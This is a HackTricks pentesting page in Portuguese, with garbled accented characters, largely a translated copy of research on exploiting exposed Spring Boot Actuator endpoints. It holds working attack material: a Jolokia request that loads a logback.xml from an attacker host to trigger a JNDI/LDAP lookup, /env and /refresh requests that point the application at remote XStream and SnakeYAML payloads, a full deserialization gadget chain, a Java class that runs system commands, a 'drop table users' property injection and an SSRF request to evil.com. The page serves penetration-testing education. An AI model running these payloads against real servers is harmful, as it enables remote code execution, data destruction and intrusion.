# Spring Actuators

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Bypass de Autentica√ß√£o do Spring**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**De** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Explorando o Spring Boot Actuators

**copiado de** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

O Framework Spring Boot inclui uma s√©rie de recursos chamados de actuators para ajudar a monitorar e gerenciar sua aplica√ß√£o web quando voc√™ a coloca em produ√ß√£o. Destinados a serem usados para auditoria, sa√∫de e coleta de m√©tricas, eles tamb√©m podem abrir uma porta oculta para o seu servidor quando mal configurados.

Quando uma aplica√ß√£o Spring Boot est√° em execu√ß√£o, ela registra automaticamente v√°rios endpoints (como '/health', '/trace', '/beans', '/env' etc) no processo de roteamento. Para o Spring Boot 1 - 1.4, eles s√£o acess√≠veis sem autentica√ß√£o, causando problemas significativos de seguran√ßa. A partir da vers√£o Spring 1.5, todos os endpoints, exceto '/health' e '/info', s√£o considerados sens√≠veis e protegidos por padr√£o, mas essa seguran√ßa muitas vezes √© desativada pelos desenvolvedores da aplica√ß√£o.

Os seguintes endpoints do Actuator podem ter potenciais implica√ß√µes de seguran√ßa que levam a poss√≠veis vulnerabilidades:

* /dump - exibe um dump de threads (incluindo um stack trace)
* /trace - exibe as √∫ltimas mensagens HTTP (que podem incluir identificadores de sess√£o)
* /logfile - exibe o conte√∫do do arquivo de log
* /shutdown - desliga a aplica√ß√£o
* /mappings - mostra todos os mapeamentos do controlador MVC
* /env - fornece acesso ao ambiente de configura√ß√£o
* /actuator/env
* /restart - reinicia a aplica√ß√£o
* /heapdump - Constr√≥i e retorna um heap dump do JVM usado pela nossa aplica√ß√£o

Para o Spring 1x, eles s√£o registrados sob a URL raiz, e no 2x eles foram movidos para o caminho base "/actuator/".

**Explora√ß√£o:**

A maioria dos actuators suporta apenas solicita√ß√µes GET e simplesmente revela dados de configura√ß√£o sens√≠veis, mas alguns deles s√£o particularmente interessantes para ca√ßadores de shell:

**1. Execu√ß√£o Remota de C√≥digo via '/jolokia'**

Se a Biblioteca Jolokia estiver no classpath da aplica√ß√£o alvo, ela ser√° automaticamente exposta pelo Spring Boot sob o endpoint '/jolokia' do actuator. O Jolokia permite acesso HTTP a todos os MBeans registrados e √© projetado para executar as mesmas opera√ß√µes que voc√™ pode executar com JMX. √â poss√≠vel listar todas as a√ß√µes de MBeans dispon√≠veis usando a URL:

[**http://127.0.0.1:8090/jolokia/list**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Novamente, a maioria das a√ß√µes de MBeans apenas revela alguns dados do sistema, mas uma √© particularmente interessante:

![reloadByURL](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_jolokia.png)

A a√ß√£o '**reloadByURL**', fornecida pela biblioteca Logback, nos permite recarregar a configura√ß√£o de log de uma URL externa. Isso pode ser acionado apenas navegando para: [**http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Ent√£o, por que devemos nos preocupar com a configura√ß√£o de log? Principalmente por duas coisas:

1. A configura√ß√£o tem um formato XML e, √© claro, o Logback o analisa com Entidades Externas habilitadas, portanto, √© vulner√°vel a XXE cego.
2. A configura√ß√£o do Logback possui o recurso ['Obtendo vari√°veis do JNDI'](https://logback.qos.ch/manual/configuration.html#insertFromJNDI). No arquivo XML, podemos incluir uma tag como '**\<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName" />**' e o atributo name ser√° passado para o m√©todo DirContext.lookup(). Se pudermos fornecer um nome arbitr√°rio para a fun√ß√£o .lookup(), nem precisamos de XXE ou HeapDump, pois isso nos d√° uma **Execu√ß√£o Remota de C√≥digo** completa.

**Como funciona:**

1\. Um atacante solicita a URL mencionada anteriormente para executar a fun√ß√£o 'reloadByURL', fornecida pela classe 'qos.logback.classic.jmx.JMXConfigurator'.

2\. A fun√ß√£o 'reloadByURL' faz o download de uma nova configura√ß√£o de [http://artsploit.com/logback.xml](http://artsploit.com/logback.xml) e a analisa como uma configura√ß√£o do Logback. Essa configura√ß√£o maliciosa deve ter o seguinte conte√∫do:
```
<configuration>
<insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName" />
</configuration>
```
3\. Quando este arquivo √© analisado no servidor vulner√°vel, ele cria uma conex√£o com o servidor LDAP controlado pelo atacante especificado no valor do par√¢metro "env-entry-name", o que leva √† resolu√ß√£o do JNDI. O servidor LDAP malicioso pode retornar um objeto do tipo 'Refer√™ncia' para desencadear uma **execu√ß√£o do bytecode fornecido** na aplica√ß√£o alvo. Os ataques JNDI s√£o bem explicados neste [artigo de pesquisa da MicroFocus](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf). A [nova t√©cnica de explora√ß√£o JNDI](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) (descrita anteriormente em nosso blog) tamb√©m funciona aqui, j√° que o Tomcat √© o servidor de aplica√ß√£o padr√£o no Spring Boot Framework.

**2. Modifica√ß√£o de configura√ß√£o via '/env'**

Se as Bibliotecas do Spring Cloud estiverem no classpath, o endpoint **'/env'** permite modificar as propriedades ambientais do Spring. Todos os beans anotados como '**@ConfigurationProperties**' podem ser modificados e reatribu√≠dos. Muitas, mas nem todas, as propriedades que podemos controlar est√£o listadas no endpoint '/configprops' do atuador. Na verdade, existem muitas delas, mas n√£o est√° claro o que precisamos modificar para alcan√ßar algo. Depois de passar alguns dias brincando com elas, encontramos isso:
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
Esta propriedade modifica a serviceURL do Eureka para um valor arbitr√°rio. O Eureka Server √© normalmente usado como um servidor de descoberta, e quase todas as aplica√ß√µes Spring Cloud se registram nele e enviam atualiza√ß√µes de status para ele. Se voc√™ tiver a sorte de ter o Eureka-Client <1.8.7 no classpath de destino (normalmente inclu√≠do no Spring Cloud Netflix), voc√™ pode explorar a vulnerabilidade de deserializa√ß√£o do **XStream** nele. Tudo que voc√™ precisa fazer √© definir a propriedade 'eureka.client.serviceUrl.defaultZone' para a URL do seu servidor ( [http://artsploit.com/n/xstream](http://artsploit.com/n/xstream)) via '/env' e depois chamar o endpoint '/refresh'. Depois disso, seu servidor deve servir a carga √∫til do XStream com o seguinte conte√∫do:
```markup
<linked-hash-set>
<jdk.nashorn.internal.objects.NativeString>
<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
<dataHandler>
<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
<is class="javax.crypto.CipherInputStream">
<cipher class="javax.crypto.NullCipher">
<serviceIterator class="javax.imageio.spi.FilterIterator">
<iter class="javax.imageio.spi.FilterIterator">
<iter class="java.util.Collections$EmptyIterator"/>
<next class="java.lang.ProcessBuilder">
<command>
<string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
</command>
<redirectErrorStream>false</redirectErrorStream>
</next>
</iter>
<filter class="javax.imageio.ImageIO$ContainsFilter">
<method>
<class>java.lang.ProcessBuilder</class>
<name>start</name>
<parameter-types/>
</method>
<name>foo</name>
</filter>
<next class="string">foo</next>
</serviceIterator>
<lock/>
</cipher>
<input class="java.lang.ProcessBuilder$NullInputStream"/>
<ibuffer></ibuffer>
</is>
</dataSource>
</dataHandler>
</value>
</jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>
```
Este payload XStream √© uma vers√£o ligeiramente modificada da cadeia de gadgets ImageIO apenas para JDK da pesquisa Marshalsec. A √∫nica diferen√ßa aqui √© o uso de **LinkedHashSet** para acionar o m√©todo 'jdk.nashorn.internal.objects.NativeString.hashCode()'. O payload original utiliza java.lang.Map para obter o mesmo comportamento, mas a configura√ß√£o do XStream do Eureka possui um [conversor personalizado para mapas](https://github.com/Netflix/eureka/blob/master/eureka-client/src/main/java/com/netflix/discovery/converters/XmlXStream.java#L58) que o torna inutiliz√°vel. O payload acima n√£o utiliza mapas e pode ser usado para obter Execu√ß√£o Remota de C√≥digo sem restri√ß√µes adicionais.

Usando os Spring Actuators, voc√™ pode explorar essa vulnerabilidade mesmo sem ter acesso a um servidor Eureka interno; voc√™ s√≥ precisa de um endpoint "/env" dispon√≠vel.

**Outras configura√ß√µes √∫teis:**

**spring.datasource.tomcat.validationQuery=drop+table+users** - permite especificar qualquer consulta SQL, que ser√° executada automaticamente no banco de dados atual. Pode ser qualquer instru√ß√£o, incluindo inser√ß√£o, atualiza√ß√£o ou exclus√£o.

![Explorando o Drop Table dos Spring Boot Actuators](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_drop\_table.png)

**spring.datasource.tomcat.url**=jdbc:hsqldb:[https://localhost:3002/xdb](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - permite modificar a string de conex√£o JDBC atual.

A √∫ltima configura√ß√£o parece √≥tima, mas o problema √© quando a aplica√ß√£o que executa a conex√£o com o banco de dados j√° est√° estabelecida, apenas atualizar a string JDBC n√£o tem nenhum efeito. Felizmente, h√° outra propriedade que pode nos ajudar nesse caso:

**spring.datasource.tomcat.max-active**=777

O truque que podemos usar aqui √© aumentar o n√∫mero de conex√µes simult√¢neas com o banco de dados. Assim, podemos alterar a string de conex√£o JDBC, aumentar o n√∫mero de conex√µes e, em seguida, enviar muitas solicita√ß√µes para a aplica√ß√£o para simular uma carga pesada. Sob carga, a aplica√ß√£o criar√° uma nova conex√£o com o banco de dados com a string JDBC maliciosa atualizada. Testei essa t√©cnica localmente com o Mysql e funciona perfeitamente.

![Explorando o Max Active dos Spring Boot Actuators](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_max\_active.png)

Al√©m disso, existem outras propriedades que parecem interessantes, mas na pr√°tica n√£o s√£o realmente √∫teis:

**spring.datasource.url** - string de conex√£o do banco de dados (usada apenas para a primeira conex√£o)

**spring.datasource.jndiName** - string JNDI do banco de dados (usada apenas para a primeira conex√£o)

**spring.datasource.tomcat.dataSourceJNDI** - string JNDI do banco de dados (n√£o utilizada)

**spring.cloud.config.uri**=[http://artsploit.com/](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - URL de configura√ß√£o do Spring Cloud (n√£o tem efeito ap√≥s o in√≠cio do aplicativo, apenas os valores iniciais s√£o usados)

Essas propriedades n√£o t√™m efeito a menos que o endpoint '/restart' seja chamado. Esse endpoint reinicia todo o ApplicationContext, mas est√° desativado por padr√£o.

Existem muitas outras propriedades interessantes, mas a maioria delas n√£o tem efeito imediato ap√≥s a altera√ß√£o.

**N.B.** No Spring Boot 2x, o formato da solicita√ß√£o para modificar propriedades via o endpoint '/env' √© ligeiramente diferente (usa formato json), mas a ideia √© a mesma.

**Um exemplo de aplicativo vulner√°vel:**

Se voc√™ quiser testar essa vulnerabilidade localmente, criei um [aplicativo Spring Boot simples na minha p√°gina do Github](https://github.com/artsploit/actuator-testbed). Todos os payloads devem funcionar l√°, exceto as configura√ß√µes do banco de dados (a menos que voc√™ as configure).

**Descoberta de caixa preta:**

Uma lista completa dos actuators padr√£o pode ser encontrada aqui: [https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt). Tenha em mente que os desenvolvedores de aplicativos podem criar seus pr√≥prios endpoints usando a anota√ß√£o @Endpoint.

**Atualiza√ß√£o de maio de 2019:**

Existe uma maneira mais confi√°vel de obter RCE por meio da modifica√ß√£o das propriedades ambientais do Spring.
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml
```
Esta solicita√ß√£o modifica a propriedade 'spring.cloud.bootstrap.location', que √© usada para carregar configura√ß√µes externas e analis√°-las no formato YAML. Para que isso aconte√ßa, tamb√©m precisamos chamar o endpoint '/refresh'.
```
POST /refresh HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
Quando a configura√ß√£o YAML √© obtida do servidor remoto, ela √© analisada com a biblioteca SnakeYAML, que tamb√©m √© suscet√≠vel a ataques de desserializa√ß√£o. A carga √∫til (yaml-payload.yml) pode ser gerada usando a pesquisa Marshalsec mencionada anteriormente:
```
!!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
]]
]
```
A desserializa√ß√£o deste arquivo aciona a execu√ß√£o do construtor do ScriptEngineManager com o URLClassLoader fornecido. Em resumo, isso leva ao m√©todo **'java.util.ServiceLoader#load(java.lang.Class\<S>, java.lang.ClassLoader)'**, que tenta encontrar todas as implementa√ß√µes da interface 'ScriptEngineFactory' em todas as bibliotecas no classpath. Como podemos adicionar uma nova biblioteca via URLClassLoader, podemos fornecer uma nova 'ScriptEngineFactory' com o bytecode malicioso interno. Para fazer isso, precisamos criar um arquivo jar com os seguintes arquivos obrigat√≥rios: [yaml-payload.jar:/artsploit/AwesomeScriptEngineFactory.class](https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java) deve conter o bytecode real, com a carga maliciosa no construtor.
```
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

public AwesomeScriptEngineFactory() {
try {
Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
} catch (IOException e) {
e.printStackTrace();
}
}
```
[yaml-payload.jar:/META-INF/services/javax.script.ScriptEngineFactory](https://github.com/artsploit/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory) deve ser apenas um arquivo de texto contendo uma refer√™ncia completa para 'artsploit.AwesomeScriptEngineFactory', para que o ServiceLoader saiba onde encontrar a classe: **artsploit.AwesomeScriptEngineFactory**. Novamente, essa t√©cnica de explora√ß√£o requer que o spring cloud esteja no classpath, mas, em compara√ß√£o com o payload do XStream do Eureka, ela funciona mesmo na vers√£o mais recente. Voc√™ pode encontrar o payload completo no meu projeto do github: [yaml-payload](https://github.com/artsploit/yaml-payload).

## Env + H2 RCE

Consulte esta p√°gina para saber como explorar a combina√ß√£o /env + H2: [https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

## SSRF no Spring Boot atrav√©s da interpreta√ß√£o incorreta do nome do caminho <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

[**A partir desta pesquisa**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation): O framework Spring aceita o caractere separador de par√¢metro de matriz `;` antes da primeira barra do nome do caminho HTTP:
```http
GET ;1337/api/v1/me HTTP/1.1
Host: target.com
Connection: close
```
Em um cen√°rio como o seguinte:

<figure><img src="../../.gitbook/assets/image (717).png" alt="" width="563"><figcaption></figcaption></figure>

Considerando que o Spring permite qualquer caractere ap√≥s o separador de par√¢metros da matriz, torna-se poss√≠vel usar o caractere `@` para buscar um endpoint arbitr√°rio tamb√©m.

Abaixo est√° um exemplo da solicita√ß√£o de explora√ß√£o:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
## Mais Informa√ß√µes

* [https://tutorialboy24.blogspot.com/2022/02/introducao-ao-spring-boot-relacionado.html](https://tutorialboy24.blogspot.com/2022/02/introducao-ao-spring-boot-relacionado.html)
* [https://blog.maass.xyz/seguranca-do-spring-actuator-parte-1-roubando-segredos-usando-spring-actuators](https://blog.maass.xyz/seguranca-do-spring-actuator-parte-1-roubando-segredos-usando-spring-actuators)
* [https://blog.maass.xyz/seguranca-do-spring-actuator-parte-2-encontrando-actuators-usando-analise-de-codigo-estatico-com-semgrep](https://blog.maass.xyz/seguranca-do-spring-actuator-parte-2-encontrando-actuators-usando-analise-de-codigo-estatico-com-semgrep)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
